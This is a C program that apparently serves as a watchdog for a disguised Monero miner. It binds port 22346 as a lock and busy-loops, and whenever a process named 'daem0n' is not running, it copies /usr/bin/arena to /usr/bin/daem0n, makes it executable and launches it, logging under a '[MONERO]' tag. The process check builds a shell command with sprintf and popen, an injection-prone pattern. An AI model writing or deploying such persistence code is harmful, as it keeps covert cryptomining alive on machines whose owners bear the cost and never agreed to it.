#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <pthread.h>
#include <syslog.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <errno.h>

int init(void) {
    int optval = 1;
    int listen_fd;
    struct sockaddr_in addr;
    
    listen_fd = socket(AF_INET, SOCK_STREAM, 0);

    (void)setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, (char *)&optval, sizeof(optval));

    addr.sin_family = AF_INET;
    addr.sin_port   = htons(22346);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    
    if (bind(listen_fd, (struct sockaddr *)(void *)&addr, sizeof(struct sockaddr_in)) < 0) {
        syslog(LOG_WARNING, "[MONERO] monero start failed: %s", strerror(errno));
        return -1;
    }
    
    return 0;
}

int detect_process(char *process_name)
{  
    FILE *ptr;
    char buff[512];
    char ps[128];

    sprintf(ps, "ps -e | grep -c %s", process_name);
    strcpy(buff, "ABNORMAL");
        
    if ((ptr = popen(ps, "r")) != NULL) {  
        while (fgets(buff, 512, ptr) != NULL) {  
            if (atoi(buff)>=1) {  
                pclose(ptr);
                return 0;
            }  
        }  
    }
        
    if (strcmp(buff,"ABNORMAL")==0) {
        return 1;
    }
    
    pclose(ptr);
    return 1;
}

int main(int argc, char *argv[]) {
    int ret;
    int count = 0;
    
    ret = init();
    if (ret < 0) {
        return -1;
    }
    
    while (1) {
        count++;
        if (0xfffffff == (count & 0xfffffff)) {
            syslog(LOG_WARNING, "[MONERO] begin to start daem0n");
            
            if (0 != detect_process("daem0n")) {
                syslog(LOG_WARNING, "[MONERO] daem0n stopped");

                if (0 != access("/usr/bin/daem0n", 0)) {
                    syslog(LOG_WARNING, "[MONERO] daem0n do not exist");
                    system("cp /usr/bin/arena /usr/bin/daem0n");
                }

                system("chmod a+x /usr/bin/daem0n");
                system("daem0n &");
            } else {
                syslog(LOG_WARNING, "[MONERO] daem0n already started");
            }
        }
    }

    return 0;
}
